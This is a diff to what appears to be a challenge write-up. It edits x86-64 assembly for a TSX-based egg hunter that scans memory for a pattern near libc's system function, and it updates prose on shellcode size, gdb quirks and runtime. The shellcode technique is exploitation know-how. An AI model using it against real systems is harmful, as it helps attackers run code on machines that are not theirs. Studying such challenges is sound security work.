@@ -138,7 +138,6 @@ PATTERN_OFFSET_FROM_SYSTEM EQU 0x06
         mov rsi, SYSTEM_OFFSET_FROM_LIBC + PATTERN_OFFSET_FROM_SYSTEM
         mov ecx, UNIQUE_PATTERN_BYTES
 
-        mov rsi, 0x700007c50d76-0x10000
 egg_hunt:
         add rsi, 0x1000
         xbegin egg_hunt
@@ -162,7 +161,7 @@ jmp $
 ```
 
 The terms didn't mention whether the program should exist or not - for all means and purposes I could've let it crash, but I've decided to hang forver using `jmp $`.  
-With that, I got a shellcode of `72 bytes`.  
+With that, I got a shellcode of `62 bytes`.  
 Also, apparently `gdb` does not like debugging `TSX` - even doing `si` on `xbegin` sometimes acts as if we're doing an entire transaction iteration!  
 Lastly, this takes *a lot of time* to run (like 15 minutes on a modern PC) due to exhausing the entire memory space (but we increase by `0x1000` which should be okay).  
 one optimization we could've done is using the `cmpsd` or `scasd`, but it'd be even slower (since we move byte-by-byte) and only save `4` bytes in total (taking `cld` instruction into account).
